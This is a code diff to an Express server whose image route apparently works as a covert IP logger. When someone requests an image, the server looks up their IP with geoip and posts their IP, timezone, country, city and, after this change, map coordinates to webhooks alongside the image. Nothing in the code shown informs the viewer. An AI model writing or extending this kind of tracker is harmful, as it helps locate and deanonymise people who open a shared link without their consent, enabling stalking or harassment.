@@ -60,11 +60,13 @@ const sendImageToWebhooks = (
   clientIP,
   timezone,
   country,
-  city
+  city,
+  ll
 ) => {
   timezone = timezone || 'not found'
   country = country || 'not found'
   city = city || 'not found'
+  ll = ll || 'not found'
 
   const randomcolors = ['#008000', '#E50000']
   const randomWebhookColor =
@@ -81,7 +83,7 @@ const sendImageToWebhooks = (
         },
         {
           name: '📡 Network',
-          value: `\`\`\`shell\n🌐 IP: ${clientIP}\n⏲️ Timezone: ${timezone}\n🌍 Country: ${country}\n🏙️ City: ${city}\`\`\``
+          value: `\`\`\`shell\n🌐 IP: ${clientIP}\n⏲️ Timezone: ${timezone}\n🌍 Country: ${country}\n🏙️ City: ${city}\n📍 Coordinates: ${ll}\`\`\``
         }
       ])
       .setThumbnail(`attachment://${imageName}`)
@@ -189,10 +191,10 @@ app.get('/image/:imageName', (req, res) => {
 
       // Get client's information
       const ipInfo = geoip.lookup(clientIP)
-      const { timezone, country, city } = ipInfo
+      const { timezone, country, city, ll } = ipInfo
 
       logger.info(
-        `Client IP: ${clientIP}, Timezone: ${timezone}, Country: ${country}, City: ${city}`
+        `Client IP: ${clientIP}, Timezone: ${timezone}, Country: ${country}, City: ${city}, Coordinates: ${ll}`
       )
 
       // Send the image to the webhooks
@@ -202,7 +204,8 @@ app.get('/image/:imageName', (req, res) => {
         clientIP,
         timezone,
         country,
-        city
+        city,
+        ll
       )
     } catch (error) {
       logger.error(`Error sending image to webhooks: ${error}`)
